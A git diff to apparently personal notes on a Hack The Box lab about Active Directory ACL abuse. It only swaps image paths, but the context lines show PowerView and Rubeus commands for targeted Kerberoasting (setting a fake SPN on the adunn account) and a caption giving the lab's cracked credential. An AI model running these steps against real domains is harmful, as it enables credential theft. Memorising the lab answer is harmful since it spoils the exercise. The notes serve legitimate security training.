@@ -151,9 +151,9 @@ PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberNa
 
 **Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer.**
 
-<figure><img src="../../../.gitbook/assets/image (83).png" alt=""><figcaption><p>Change damundsens' password</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (51).png" alt=""><figcaption><p>Change damundsens' password</p></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (84).png" alt=""><figcaption><p>add damundsens to Help Desk Level 1</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption><p>add damundsens to Help Desk Level 1</p></figcaption></figure>
 
 Targetted kerberoasting
 
@@ -165,4 +165,4 @@ Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname=
 .\Rubeus.exe kerberoast /user:adunn /nowrap
 ```
 
-<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption><p>adunn:SyncMaster757</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption><p>adunn:SyncMaster757</p></figcaption></figure>
